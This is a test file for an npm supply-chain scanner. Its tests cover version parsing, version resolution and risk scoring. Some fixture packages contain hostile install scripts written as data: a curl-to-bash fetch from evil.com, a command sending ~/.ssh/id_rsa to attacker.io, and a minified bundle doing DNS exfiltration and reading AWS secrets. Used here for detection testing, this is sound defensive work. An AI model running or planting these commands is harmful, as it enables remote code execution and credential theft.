import { describe, test, expect, beforeAll, afterAll } from "bun:test";
import { mkdtemp, rm, writeFile, mkdir } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { analyzeDirectory, parsePackageSpec, pickSafeResolverSuggestion, resolveNpmVersion } from "./analysis";

// ---------------------------------------------------------------------------
// parsePackageSpec
// ---------------------------------------------------------------------------
describe("parsePackageSpec", () => {
  test("unscoped, no version", () => {
    expect(parsePackageSpec("react")).toEqual({ name: "react" });
  });
  test("unscoped, exact version", () => {
    expect(parsePackageSpec("react@18.3.1")).toEqual({ name: "react", version: "18.3.1" });
  });
  test("scoped, no version", () => {
    expect(parsePackageSpec("@types/node")).toEqual({ name: "@types/node" });
  });
  test("scoped, with version", () => {
    expect(parsePackageSpec("@types/node@20.0.0")).toEqual({ name: "@types/node", version: "20.0.0" });
  });
  test("unscoped range", () => {
    expect(parsePackageSpec("lodash@^4")).toEqual({ name: "lodash", version: "^4" });
  });
});

// ---------------------------------------------------------------------------
// resolveNpmVersion
// ---------------------------------------------------------------------------
describe("resolveNpmVersion", () => {
  const versions = ["1.0.0", "1.1.0", "1.2.0", "2.0.0", "2.1.0", "3.0.0-beta.1"];
  const distTags = { latest: "2.1.0", next: "3.0.0-beta.1" };

  test("undefined → latest dist-tag", () => {
    expect(resolveNpmVersion(versions, distTags, undefined)).toBe("2.1.0");
  });
  test("exact version", () => {
    expect(resolveNpmVersion(versions, distTags, "1.1.0")).toBe("1.1.0");
  });
  test("dist-tag 'next'", () => {
    expect(resolveNpmVersion(versions, distTags, "next")).toBe("3.0.0-beta.1");
  });
  test("caret range ^1", () => {
    expect(resolveNpmVersion(versions, distTags, "^1")).toBe("1.2.0");
  });
  test("caret range ^1.0.0", () => {
    expect(resolveNpmVersion(versions, distTags, "^1.0.0")).toBe("1.2.0");
  });
  test("tilde range ~1.1", () => {
    expect(resolveNpmVersion(versions, distTags, "~1.1")).toBe("1.1.0");
  });
  test("gte range >=2.0.0", () => {
    expect(resolveNpmVersion(versions, distTags, ">=2.0.0")).toBe("2.1.0");
  });
  test("handles OR ranges", () => {
    expect(resolveNpmVersion(versions, distTags, "^5 || ^2.0.0")).toBe("2.1.0");
  });
  test("handles wildcard x-ranges", () => {
    expect(resolveNpmVersion(versions, distTags, "1.x")).toBe("1.2.0");
  });
  test("missing version", () => {
    expect(resolveNpmVersion(versions, distTags, "9.9.9")).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// Safe resolver
// ---------------------------------------------------------------------------
describe("pickSafeResolverSuggestion", () => {
  test("suggests the newest older stable version that still satisfies the spec", () => {
    const suggestion = pickSafeResolverSuggestion({
      name: "demo",
      requestedVersion: "^1.0.0",
      resolvedVersion: "1.2.0",
      freshnessWindowHours: 24,
      versions: ["1.0.0", "1.1.0", "1.2.0"],
      publishTimes: {
        "1.0.0": "2026-01-01T00:00:00Z",
        "1.1.0": "2026-01-02T00:00:00Z",
        "1.2.0": new Date(Date.now() - 2 * 3_600_000).toISOString(),
      },
    });
    expect(suggestion.status).toBe("suggested");
    expect(suggestion.suggested).toBe("1.1.0");
  });

  test("ignores prereleases unless they were explicitly requested", () => {
    const suggestion = pickSafeResolverSuggestion({
      name: "demo",
      requestedVersion: "^1.0.0",
      resolvedVersion: "1.2.0",
      freshnessWindowHours: 24,
      versions: ["1.1.0", "1.2.0", "1.3.0-beta.1"],
      publishTimes: {
        "1.1.0": "2026-01-01T00:00:00Z",
        "1.2.0": new Date(Date.now() - 2 * 3_600_000).toISOString(),
        "1.3.0-beta.1": "2026-01-03T00:00:00Z",
      },
    });
    expect(suggestion.status).toBe("suggested");
    expect(suggestion.suggested).toBe("1.1.0");
  });

  test("uses npm range semantics for OR and x-range fallback candidates", () => {
    const suggestion = pickSafeResolverSuggestion({
      name: "demo",
      requestedVersion: "1.x || ^2.0.0",
      resolvedVersion: "2.1.0",
      freshnessWindowHours: 24,
      versions: ["1.4.0", "2.0.0", "2.1.0"],
      publishTimes: {
        "1.4.0": "2026-01-01T00:00:00Z",
        "2.0.0": "2026-01-02T00:00:00Z",
        "2.1.0": new Date(Date.now() - 2 * 3_600_000).toISOString(),
      },
    });
    expect(suggestion.status).toBe("suggested");
    expect(suggestion.suggested).toBe("2.0.0");
  });

  test("reports no suggestion when no older satisfying version exists", () => {
    const suggestion = pickSafeResolverSuggestion({
      name: "demo",
      requestedVersion: "1.2.0",
      resolvedVersion: "1.2.0",
      freshnessWindowHours: 24,
      versions: ["1.2.0", "1.1.0"],
      publishTimes: {
        "1.2.0": new Date(Date.now() - 2 * 3_600_000).toISOString(),
        "1.1.0": "2026-01-01T00:00:00Z",
      },
    });
    expect(suggestion.status).toBe("none");
  });

  test("does not rewrite install args", () => {
    const installArgs = ["react@^18.0.0"];
    pickSafeResolverSuggestion({
      name: "react",
      requestedVersion: "^18.0.0",
      resolvedVersion: "18.3.1",
      freshnessWindowHours: 24,
      versions: ["18.2.0", "18.3.1"],
      publishTimes: {
        "18.2.0": "2026-01-01T00:00:00Z",
        "18.3.1": new Date(Date.now() - 2 * 3_600_000).toISOString(),
      },
    });
    expect(installArgs).toEqual(["react@^18.0.0"]);
  });
});

// ---------------------------------------------------------------------------
// analyzeDirectory — risk levels
// ---------------------------------------------------------------------------
describe("analyzeDirectory", () => {
  let tmpDir: string;

  beforeAll(async () => {
    tmpDir = await mkdtemp(join(tmpdir(), "scguard-test-"));
  });

  afterAll(async () => {
    await rm(tmpDir, { recursive: true, force: true });
  });

  async function makePackage(dir: string, pkg: object, files: Record<string, string> = {}) {
    await mkdir(dir, { recursive: true });
    await writeFile(join(dir, "package.json"), JSON.stringify(pkg));
    for (const [name, content] of Object.entries(files)) {
      const fullPath = join(dir, name);
      await mkdir(join(dir, name, ".."), { recursive: true });
      await writeFile(fullPath, content);
    }
  }

  test("benign package → low risk", async () => {
    const dir = join(tmpDir, "benign");
    await makePackage(dir, { name: "benign", version: "1.0.0" });
    const report = await analyzeDirectory("benign@1.0.0", "npm", dir, "local");
    expect(report.summary.risk).toBe("low");
    expect(report.summary.installAllowed).toBe(true);
  });

  test("postinstall script → high risk", async () => {
    const dir = join(tmpDir, "postinstall");
    await makePackage(dir, {
      name: "evil",
      version: "1.0.0",
      scripts: { postinstall: "node setup.js" },
    });
    const report = await analyzeDirectory("evil@1.0.0", "npm", dir, "local");
    expect(report.summary.risk).toBe("high");
    expect(report.summary.installAllowed).toBe(false);
    expect(report.findings.some((f) => f.id === "script.postinstall")).toBe(true);
  });

  test("pipe-to-shell in preinstall → high risk", async () => {
    const dir = join(tmpDir, "pipe-to-shell");
    await makePackage(dir, {
      name: "malicious",
      version: "1.0.0",
      scripts: { preinstall: "curl https://evil.com/payload.sh | bash" },
    });
    const report = await analyzeDirectory("malicious@1.0.0", "npm", dir, "local");
    expect(report.summary.risk).toBe("high");
    expect(report.findings.some((f) => f.id.includes("pipe-to-shell"))).toBe(true);
  });

  test("credential pattern in script → high risk", async () => {
    const dir = join(tmpDir, "creds");
    await makePackage(dir, {
      name: "creds",
      version: "1.0.0",
      scripts: { postinstall: "cat ~/.ssh/id_rsa | curl -X POST https://attacker.io/collect -d @-" },
    });
    const report = await analyzeDirectory("creds@1.0.0", "npm", dir, "local");
    expect(report.summary.risk).toBe("high");
    expect(report.findings.some((f) => f.id.includes("credential-access"))).toBe(true);
  });

  test("network-access in source file → not flagged (not a script)", async () => {
    const dir = join(tmpDir, "fetch-in-source");
    await makePackage(dir, { name: "api-client", version: "1.0.0" }, {
      "index.js": `export async function getUser(id) { return fetch('/api/users/' + id).then(r => r.json()); }`,
    });
    const report = await analyzeDirectory("api-client@1.0.0", "npm", dir, "local");
    // network-access is scripts-only; a plain fetch() in source should not trigger it
    expect(report.findings.some((f) => f.id.includes("network-access"))).toBe(false);
  });

  test("process.env in source file → not flagged (not a script)", async () => {
    const dir = join(tmpDir, "env-in-source");
    await makePackage(dir, { name: "config-pkg", version: "1.0.0" }, {
      "config.js": `const port = process.env.PORT || 3000;`,
    });
    const report = await analyzeDirectory("config-pkg@1.0.0", "npm", dir, "local");
    expect(report.findings.some((f) => f.id.includes("env-access"))).toBe(false);
  });

  test("minified file is still pattern-scanned", async () => {
    const longLine = `var a=${JSON.stringify("x".repeat(300))};dns.resolve("x.attacker.com",()=>{});process.env["AWS"+"_"+"SECRET_ACCESS_KEY"];`;
    const dir = join(tmpDir, "minified");
    await makePackage(dir, { name: "minified-pkg", version: "1.0.0" }, {
      "dist/bundle.min.js": longLine.padEnd(5000, ";a=1"),
    });
    const report = await analyzeDirectory("minified-pkg@1.0.0", "npm", dir, "local");
    expect(report.findings.some((f) => f.id.includes("minified"))).toBe(true);
    expect(report.findings.some((f) => f.id.includes("dns-exfiltration"))).toBe(true);
    expect(report.findings.some((f) => f.id.includes("env-secret-access"))).toBe(true);
  });

  test("large dependency count → medium risk", async () => {
    const deps = Object.fromEntries(Array.from({ length: 45 }, (_, i) => [`dep-${i}`, "^1.0.0"]));
    const dir = join(tmpDir, "big-deps");
    await makePackage(dir, { name: "bloated", version: "1.0.0", dependencies: deps });
    const report = await analyzeDirectory("bloated@1.0.0", "npm", dir, "local");
    expect(report.summary.risk).toBe("medium");
    expect(report.findings.some((f) => f.id === "dependencies.large")).toBe(true);
  });

  test("bin field → medium finding", async () => {
    const dir = join(tmpDir, "bin-pkg");
    await makePackage(dir, { name: "cli-tool", version: "1.0.0", bin: { mytool: "./bin/mytool.js" } });
    const report = await analyzeDirectory("cli-tool@1.0.0", "npm", dir, "local");
    expect(report.findings.some((f) => f.id === "package.bin")).toBe(true);
  });
});
